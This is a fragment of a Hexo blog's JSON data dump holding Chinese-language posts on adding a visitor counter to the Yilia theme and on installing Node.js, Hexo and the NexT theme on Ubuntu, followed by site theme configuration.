</span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt; &lt;%</span></span></span><span class=\"perl\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">index</span>)&#123;</span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt; article-index&lt;%</span></span></span><span class=\"perl\">&#125;</span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt;\"</span> <span class=\"hljs-attr\">itemscope</span> <span class=\"hljs-attr\">itemprop</span>=<span class=\"hljs-string\">\"blogPost\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"article-inner\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> (post.link || post.title)&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">header</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"article-header\"</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\">- partial(<span class=\"hljs-string\">'post/title'</span>, &#123;class_name: <span class=\"hljs-string\">'article-title'</span>&#125;) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> (!post.noDate)&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\">- partial(<span class=\"hljs-string\">'post/date'</span>, &#123;class_name: <span class=\"hljs-string\">'archive-article-date'</span>, date_format: null&#125;) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">header</span>&gt;</span>\n\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> ( !<span class=\"hljs-keyword\">index</span> )&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"archive-article-date\"</span>&gt;</span>\n\t\t\t阅读量 <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_value_page_pv\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n```    \n\n##### 添加访问量统计\n打开同一目录下的`footer.ejs`文件，添加以下代码</span></code></pre></p>\n<p><script async src=\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"></script><br><span id=\"busuanzi_container_site_uv\"><br>  本站访客数<span id=\"busuanzi_value_site_uv\"></span>人次<br></span><br><pre><code class=\"hljs undefined\"><span class=\"xml\">位置：`<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">footer</span>&gt;</span>`上面，代码如下\n\n```<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">footer</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"footer\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"outer\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"footer-info\"</span>&gt;</span>\n    \t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"footer-left\"</span>&gt;</span>\n    \t\t&amp;copy; <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%=</span></span></span><span class=\"ruby\"> date(new Date(), <span class=\"hljs-string\">'YYYY'</span>) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%=</span></span></span><span class=\"ruby\"> config.author <span class=\"hljs-params\">||</span> config.title </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    \t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n      \t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"footer-right\"</span>&gt;</span>\n      \t\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"http://hexo.io/\"</span> <span class=\"hljs-attr\">target</span>=<span class=\"hljs-string\">\"_blank\"</span>&gt;</span>Hexo<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span>  Theme <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"https://github.com/litten/hexo-theme-yilia\"</span> <span class=\"hljs-attr\">target</span>=<span class=\"hljs-string\">\"_blank\"</span>&gt;</span>Yilia<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span> by Litten\n      \t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_container_site_uv\"</span>&gt;</span> \n  本站访客数<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_value_site_uv\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>人次\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">footer</span>&gt;</span></span></code></pre></p>\n<h5 id=\"隐藏power链接\"><a href=\"#隐藏power链接\" class=\"headerlink\" title=\"隐藏power链接\"></a>隐藏power链接</h5><p>也是<code>footer.ejs</code>文件<br><pre><code class=\"hljs undefined\">&lt;<span class=\"hljs-keyword\">div</span> class=<span class=\"hljs-string\">\"footer-right\"</span>&gt;\n      \t&lt;<span class=\"hljs-keyword\">a</span> href=<span class=\"hljs-string\">\"http://hexo.io/\"</span> target=<span class=\"hljs-string\">\"_blank\"</span>&gt;Hexo&lt;/<span class=\"hljs-keyword\">a</span>&gt;  Theme &lt;<span class=\"hljs-keyword\">a</span> href=<span class=\"hljs-string\">\"https://github.com/litten/hexo-theme-yilia\"</span> target=<span class=\"hljs-string\">\"_blank\"</span>&gt;Yilia&lt;/<span class=\"hljs-keyword\">a</span>&gt; <span class=\"hljs-keyword\">by</span> Litten\n&lt;/<span class=\"hljs-keyword\">div</span>&gt;</code></pre></p>\n<p>对这段代码添加注释符<code>&lt;!-- --&gt;</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">&lt;!--&lt;div class=\"footer-right\"&gt;\n      \t&lt;a href=\"http://hexo.io/\" target=\"_blank\"&gt;Hexo&lt;/a&gt;  Theme &lt;a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\"&gt;Yilia&lt;/a&gt; by Litten\n&lt;/div&gt;--&gt;</span></code></pre></p>\n<h5 id=\"或者\"><a href=\"#或者\" class=\"headerlink\" title=\"或者\"></a>或者</h5><p>你也可以写自己喜欢的文字上去，比如<br><pre><code class=\"hljs undefined\">&lt;<span class=\"hljs-keyword\">div</span>&gt;\n\t做自己想做的事~\n&lt;/<span class=\"hljs-keyword\">div</span>&gt;</code></pre></p>\n<p>效果如下<br><img src=\"/img/2018-05-07/1.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>暂时做到这里，以后如果有看到喜欢的或者有好的想法都会补充</p>"},{"title":"第一次搭建博客","index_img":"/img/2018-05-07/index.jpg","date":"2018-05-06T18:39:30.000Z","_content":"### 为什么要搭建博客呢？\n~~写博客可以增长知识~~\n~~写博客可以装逼~~\n<!--more-->\n#### 写在前面\n&emsp;&emsp;写博客可以记录学习上遇到的问题，记录自己的学习过程，对于非常白的小白来说<del>绝对不是我</del>，自己扒资料扒博客是比较痛苦的，很多基础知识不会的话很容易出一些很难搜索到的问题，就比较痛苦了，建议可以先学习一些预备知识，下面讲一下整个搭博客的过程\n#### 概念\n &emsp;&emsp;对于用云服务器这一类的建议在本地搭建一个虚拟机进行尝试后再对服务器动刀（大神绕过），因为已经做好了，我就拿本地复现一遍，我的服务器是`ubuntu 16`，本地也用同样的系统搭建，不同的系统命令也不同。<br>我选用的框架是hexo,这个框架速度快、支持markdown、一键部署、有很多插件<del>（还不是因为不会用其他的）</del>，网上也有很多同样的教程，教程千篇一律，bug各种各样，希望这篇博客对你有所帮助\n##### 大概流程就是\n`安装nodejs环境-->安装hexo-->下载一款好看的主题（可省）-->发布你的博客`<br>酱酱酱\n#### 一、nodejs安装教程 \n```\nsudo apt-get install nodejs\nsudo apt-get install npm\n```\n两行代码OK啦，不是ubuntu系统的可以点击这里查看其他命令-->[传送门](http://www.runoob.com/nodejs/nodejs-install-setup.html)\n#### 二、hexo安装\n```\nsudo npm install -g hexo-cli\n```\n##### 坑一\napt-get 安装的nodejs是4.2.6，hexo需要6.9.0，爬了好多博客才找到\n```\nsudo npm install -g n\nsudo n 6.9.0\n或者 sudo n stable\n```\n现在执行刚刚的命令就可以安装hexo了，使用\n```\nhexo -v\n```\n可以查看是否正确安装，正确安装会有以下输出提示\n```\nhexo-cli: 1.1.0\nos: Linux 4.10.0-28-generic linux x64\nhttp_parser: 2.8.0\nnode: 10.0.0\nv8: 6.6.346.24-node.5\nuv: 1.20.2\nzlib: 1.2.11\nares: 1.14.0\nmodules: 64\nnghttp2: 1.29.0\nnapi: 3\nopenssl: 1.1.0h\nicu: 61.1\nunicode: 10.0\ncldr: 33.0\ntz: 2018c\n```\n选择一个空的文件夹作为你的站点，在当前路径下初始化你的hexo(报错加sudo试试)\n```\nhexo init\nnpm install\n```\n这样子网站就初步建好了，网站的目录结构就是下面这样子的\n```\n.\n├── _config.yml\n├── package.json\n├── scaffolds\n├── source\n |   └── _posts\n└── themes\n```\n&emsp;&emsp;`_config.yml` 文件存放着网站的配置信息，可以在这里配置大部分的参数。\n`package.json` 文件存放着插件信息，从中可以查看那些插件已经安装。\n`scaffolds` 是模板文件夹，新建文章时，Hexo 会根据 scaffold 来建立文件，不过这个模板和后面的主题里指的模板不一样。\n`source` 是存放用户资源的地方的文件夹，除 `_posts` 文件夹之外，开头命名为 _ (下划线) 的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 `public` 文件夹（别急，等下会生成的），而其他文件会被拷贝过去。\n`themes` 主题文件夹，Hexo 会根据主题来生成静态页面，我们以后自己安装的主题也都会放在这个文件夹下面，默认的 `landscape` 主题已经在里面了。\n现在我们启动我们的博客\n```\nhexo server\n简写 hexo s\n```\n提示4000端口被占用的[百度](www.baidu.com)下方法\n#### 完工\n不出意外应该都看得到这两条信息\n```\nINFO  Start processing\nINFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.\n```\n现在访问我们虚拟机的ip:4000就可以看到我们的博客啦 \n![hexo](/img/2018-05-07/hexo.png)\n再换一个好看点的主题就可以啦\n```\ngit clone https://github.com/iissnan/hexo-theme-next themes/next\n```\n要在站点目录下这个很重要！\n要在站点目录下这个很重要！\n要在站点目录下这个很重要！\n~~太笨了当初在这卡了久~~  重要的事情说三遍\n再在站点文件夹下的配置文件`_config.yml`更换主题就OK啦\n```\nvim _config.yml\n```\n往下滚到这个位置\n```\ntheme: landscape\n```\n把landscape换成next就ok啦，最后重启下博客\n![next](/img/2018-05-07/next.png)\n#### 完善\n&emsp;&emsp;相信很多小伙伴都觉得挺一般的，这个只是雏形，还有更多细节优化美化要去处理，觉得我的博客不错的可以看看这篇博客\n戳这里-->[here](https://blog.csdn.net/qq_33699981/article/details/72716951)\n\n\n\n\n\n\n","source":"_posts/2018-05-07-frist-try.md","raw":"---\ntitle: 第一次搭建博客\nindex_img: /img/2018-05-07/index.jpg\ndate: 2018-05-07 02:39:30\ntags: \n- hexo\n---\n### 为什么要搭建博客呢？\n~~写博客可以增长知识~~\n~~写博客可以装逼~~\n<!--more-->\n#### 写在前面\n&emsp;&emsp;写博客可以记录学习上遇到的问题，记录自己的学习过程，对于非常白的小白来说<del>绝对不是我</del>，自己扒资料扒博客是比较痛苦的，很多基础知识不会的话很容易出一些很难搜索到的问题，就比较痛苦了，建议可以先学习一些预备知识，下面讲一下整个搭博客的过程\n#### 概念\n &emsp;&emsp;对于用云服务器这一类的建议在本地搭建一个虚拟机进行尝试后再对服务器动刀（大神绕过），因为已经做好了，我就拿本地复现一遍，我的服务器是`ubuntu 16`，本地也用同样的系统搭建，不同的系统命令也不同。<br>我选用的框架是hexo,这个框架速度快、支持markdown、一键部署、有很多插件<del>（还不是因为不会用其他的）</del>，网上也有很多同样的教程，教程千篇一律，bug各种各样，希望这篇博客对你有所帮助\n##### 大概流程就是\n`安装nodejs环境-->安装hexo-->下载一款好看的主题（可省）-->发布你的博客`<br>酱酱酱\n#### 一、nodejs安装教程 \n```\nsudo apt-get install nodejs\nsudo apt-get install npm\n```\n两行代码OK啦，不是ubuntu系统的可以点击这里查看其他命令-->[传送门](http://www.runoob.com/nodejs/nodejs-install-setup.html)\n#### 二、hexo安装\n```\nsudo npm install -g hexo-cli\n```\n##### 坑一\napt-get 安装的nodejs是4.2.6，hexo需要6.9.0，爬了好多博客才找到\n```\nsudo npm install -g n\nsudo n 6.9.0\n或者 sudo n stable\n```\n现在执行刚刚的命令就可以安装hexo了，使用\n```\nhexo -v\n```\n可以查看是否正确安装，正确安装会有以下输出提示\n```\nhexo-cli: 1.1.0\nos: Linux 4.10.0-28-generic linux x64\nhttp_parser: 2.8.0\nnode: 10.0.0\nv8: 6.6.346.24-node.5\nuv: 1.20.2\nzlib: 1.2.11\nares: 1.14.0\nmodules: 64\nnghttp2: 1.29.0\nnapi: 3\nopenssl: 1.1.0h\nicu: 61.1\nunicode: 10.0\ncldr: 33.0\ntz: 2018c\n```\n选择一个空的文件夹作为你的站点，在当前路径下初始化你的hexo(报错加sudo试试)\n```\nhexo init\nnpm install\n```\n这样子网站就初步建好了，网站的目录结构就是下面这样子的\n```\n.\n├── _config.yml\n├── package.json\n├── scaffolds\n├── source\n |   └── _posts\n└── themes\n```\n&emsp;&emsp;`_config.yml` 文件存放着网站的配置信息，可以在这里配置大部分的参数。\n`package.json` 文件存放着插件信息，从中可以查看那些插件已经安装。\n`scaffolds` 是模板文件夹，新建文章时，Hexo 会根据 scaffold 来建立文件，不过这个模板和后面的主题里指的模板不一样。\n`source` 是存放用户资源的地方的文件夹，除 `_posts` 文件夹之外，开头命名为 _ (下划线) 的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 `public` 文件夹（别急，等下会生成的），而其他文件会被拷贝过去。\n`themes` 主题文件夹，Hexo 会根据主题来生成静态页面，我们以后自己安装的主题也都会放在这个文件夹下面，默认的 `landscape` 主题已经在里面了。\n现在我们启动我们的博客\n```\nhexo server\n简写 hexo s\n```\n提示4000端口被占用的[百度](www.baidu.com)下方法\n#### 完工\n不出意外应该都看得到这两条信息\n```\nINFO  Start processing\nINFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.\n```\n现在访问我们虚拟机的ip:4000就可以看到我们的博客啦 \n![hexo](/img/2018-05-07/hexo.png)\n再换一个好看点的主题就可以啦\n```\ngit clone https://github.com/iissnan/hexo-theme-next themes/next\n```\n要在站点目录下这个很重要！\n要在站点目录下这个很重要！\n要在站点目录下这个很重要！\n~~太笨了当初在这卡了久~~  重要的事情说三遍\n再在站点文件夹下的配置文件`_config.yml`更换主题就OK啦\n```\nvim _config.yml\n```\n往下滚到这个位置\n```\ntheme: landscape\n```\n把landscape换成next就ok啦，最后重启下博客\n![next](/img/2018-05-07/next.png)\n#### 完善\n&emsp;&emsp;相信很多小伙伴都觉得挺一般的，这个只是雏形，还有更多细节优化美化要去处理，觉得我的博客不错的可以看看这篇博客\n戳这里-->[here](https://blog.csdn.net/qq_33699981/article/details/72716951)\n\n\n\n\n\n\n","slug":"frist-try","published":1,"mouth":"05","updated":"2020-09-17T06:56:39.116Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoy10011ez8kr67wwkid","content":"<h3 id=\"为什么要搭建博客呢？\"><a href=\"#为什么要搭建博客呢？\" class=\"headerlink\" title=\"为什么要搭建博客呢？\"></a>为什么要搭建博客呢？</h3><p><del>写博客可以增长知识</del><br><del>写博客可以装逼</del><br><a id=\"more\"></a></p>\n<h4 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h4><p>&emsp;&emsp;写博客可以记录学习上遇到的问题，记录自己的学习过程，对于非常白的小白来说<del>绝对不是我</del>，自己扒资料扒博客是比较痛苦的，很多基础知识不会的话很容易出一些很难搜索到的问题，就比较痛苦了，建议可以先学习一些预备知识，下面讲一下整个搭博客的过程</p>\n<h4 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h4><p> &emsp;&emsp;对于用云服务器这一类的建议在本地搭建一个虚拟机进行尝试后再对服务器动刀（大神绕过），因为已经做好了，我就拿本地复现一遍，我的服务器是<code>ubuntu 16</code>，本地也用同样的系统搭建，不同的系统命令也不同。<br>我选用的框架是hexo,这个框架速度快、支持markdown、一键部署、有很多插件<del>（还不是因为不会用其他的）</del>，网上也有很多同样的教程，教程千篇一律，bug各种各样，希望这篇博客对你有所帮助</p>\n<h5 id=\"大概流程就是\"><a href=\"#大概流程就是\" class=\"headerlink\" title=\"大概流程就是\"></a>大概流程就是</h5><p><code>安装nodejs环境--&gt;安装hexo--&gt;下载一款好看的主题（可省）--&gt;发布你的博客</code><br>酱酱酱</p>\n<h4 id=\"一、nodejs安装教程\"><a href=\"#一、nodejs安装教程\" class=\"headerlink\" title=\"一、nodejs安装教程\"></a>一、nodejs安装教程</h4><pre><code class=\"hljs undefined\">sudo apt-<span class=\"hljs-builtin-name\">get</span> install nodejs\nsudo apt-<span class=\"hljs-builtin-name\">get</span> install npm</code></pre>\n<p>两行代码OK啦，不是ubuntu系统的可以点击这里查看其他命令–&gt;<a href=\"http://www.runoob.com/nodejs/nodejs-install-setup.html\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h4 id=\"二、hexo安装\"><a href=\"#二、hexo安装\" class=\"headerlink\" title=\"二、hexo安装\"></a>二、hexo安装</h4><pre><code class=\"hljs undefined\">sudo npm install -g hexo-<span class=\"hljs-keyword\">cli</span></code></pre>\n<h5 id=\"坑一\"><a href=\"#坑一\" class=\"headerlink\" title=\"坑一\"></a>坑一</h5><p>apt-get 安装的nodejs是4.2.6，hexo需要6.9.0，爬了好多博客才找到<br><pre><code class=\"hljs undefined\">sudo npm install -g <span class=\"hljs-built_in\">n</span>\nsudo <span class=\"hljs-built_in\">n</span> <span class=\"hljs-number\">6.9</span>.<span class=\"hljs-number\">0</span>\n或者 sudo <span class=\"hljs-built_in\">n</span> stable</code></pre></p>\n<p>现在执行刚刚的命令就可以安装hexo了，使用<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">hexo -v</span></code></pre></p>\n<p>可以查看是否正确安装，正确安装会有以下输出提示<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">hexo-cli</span>: 1<span class=\"hljs-selector-class\">.1</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">os</span>: <span class=\"hljs-selector-tag\">Linux</span> 4<span class=\"hljs-selector-class\">.10</span><span class=\"hljs-selector-class\">.0-28-generic</span> <span class=\"hljs-selector-tag\">linux</span> <span class=\"hljs-selector-tag\">x64</span>\n<span class=\"hljs-selector-tag\">http_parser</span>: 2<span class=\"hljs-selector-class\">.8</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">node</span>: 10<span class=\"hljs-selector-class\">.0</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">v8</span>: 6<span class=\"hljs-selector-class\">.6</span><span class=\"hljs-selector-class\">.346</span><span class=\"hljs-selector-class\">.24-node</span><span class=\"hljs-selector-class\">.5</span>\n<span class=\"hljs-selector-tag\">uv</span>: 1<span class=\"hljs-selector-class\">.20</span><span class=\"hljs-selector-class\">.2</span>\n<span class=\"hljs-selector-tag\">zlib</span>: 1<span class=\"hljs-selector-class\">.2</span><span class=\"hljs-selector-class\">.11</span>\n<span class=\"hljs-selector-tag\">ares</span>: 1<span class=\"hljs-selector-class\">.14</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">modules</span>: 64\n<span class=\"hljs-selector-tag\">nghttp2</span>: 1<span class=\"hljs-selector-class\">.29</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">napi</span>: 3\n<span class=\"hljs-selector-tag\">openssl</span>: 1<span class=\"hljs-selector-class\">.1</span><span class=\"hljs-selector-class\">.0h</span>\n<span class=\"hljs-selector-tag\">icu</span>: 61<span class=\"hljs-selector-class\">.1</span>\n<span class=\"hljs-selector-tag\">unicode</span>: 10<span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">cldr</span>: 33<span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">tz</span>: 2018<span class=\"hljs-selector-tag\">c</span></code></pre></p>\n<p>选择一个空的文件夹作为你的站点，在当前路径下初始化你的hexo(报错加sudo试试)<br><pre><code class=\"hljs undefined\">hexo init\nnpm <span class=\"hljs-keyword\">install</span></code></pre></p>\n<p>这样子网站就初步建好了，网站的目录结构就是下面这样子的<br><pre><code class=\"hljs undefined\">.\n├── _config.yml\n├── <span class=\"hljs-keyword\">package</span>.json\n├── scaffolds\n├── <span class=\"hljs-keyword\">source</span>\n |   └── _posts\n└── themes</code></pre></p>\n<p>&emsp;&emsp;<code>_config.yml</code> 文件存放着网站的配置信息，可以在这里配置大部分的参数。<br><code>package.json</code> 文件存放着插件信息，从中可以查看那些插件已经安装。<br><code>scaffolds</code> 是模板文件夹，新建文章时，Hexo 会根据 scaffold 来建立文件，不过这个模板和后面的主题里指的模板不一样。<br><code>source</code> 是存放用户资源的地方的文件夹，除 <code>_posts</code> 文件夹之外，开头命名为 _ (下划线) 的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹（别急，等下会生成的），而其他文件会被拷贝过去。<br><code>themes</code> 主题文件夹，Hexo 会根据主题来生成静态页面，我们以后自己安装的主题也都会放在这个文件夹下面，默认的 <code>landscape</code> 主题已经在里面了。<br>现在我们启动我们的博客<br><pre><code class=\"hljs undefined\">hexo<span class=\"hljs-built_in\"> server\n</span>简写 hexo s</code></pre></p>\n<p>提示4000端口被占用的<a href=\"www.baidu.com\">百度</a>下方法</p>\n<h4 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h4><p>不出意外应该都看得到这两条信息<br><pre><code class=\"hljs undefined\">INFO  <span class=\"hljs-keyword\">Start</span> processing\nINFO  Hexo <span class=\"hljs-keyword\">is</span> running <span class=\"hljs-keyword\">at</span> <span class=\"hljs-keyword\">http</span>://localhost:<span class=\"hljs-number\">4000</span>/. Press Ctrl+C <span class=\"hljs-keyword\">to</span> stop.</code></pre></p>\n<p>现在访问我们虚拟机的ip:4000就可以看到我们的博客啦<br><img src=\"/img/2018-05-07/hexo.png\" srcset=\"/img/static/loading.gif\" alt=\"hexo\"><br>再换一个好看点的主题就可以啦<br><pre><code class=\"hljs undefined\">git clone http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/iissnan/hexo-theme-<span class=\"hljs-keyword\">next</span> themes/<span class=\"hljs-keyword\">next</span></code></pre></p>\n<p>要在站点目录下这个很重要！<br>要在站点目录下这个很重要！<br>要在站点目录下这个很重要！<br><del>太笨了当初在这卡了久</del>  重要的事情说三遍<br>再在站点文件夹下的配置文件<code>_config.yml</code>更换主题就OK啦<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">vim</span> _<span class=\"hljs-selector-tag\">config</span><span class=\"hljs-selector-class\">.yml</span></code></pre></p>\n<p>往下滚到这个位置<br><pre><code class=\"hljs undefined\"><span class=\"hljs-symbol\">theme:</span> landscape</code></pre></p>\n<p>把landscape换成next就ok啦，最后重启下博客<br><img src=\"/img/2018-05-07/next.png\" srcset=\"/img/static/loading.gif\" alt=\"next\"></p>\n<h4 id=\"完善\"><a href=\"#完善\" class=\"headerlink\" title=\"完善\"></a>完善</h4><p>&emsp;&emsp;相信很多小伙伴都觉得挺一般的，这个只是雏形，还有更多细节优化美化要去处理，觉得我的博客不错的可以看看这篇博客<br>戳这里–&gt;<a href=\"https://blog.csdn.net/qq_33699981/article/details/72716951\" target=\"_blank\" rel=\"noopener\">here</a></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 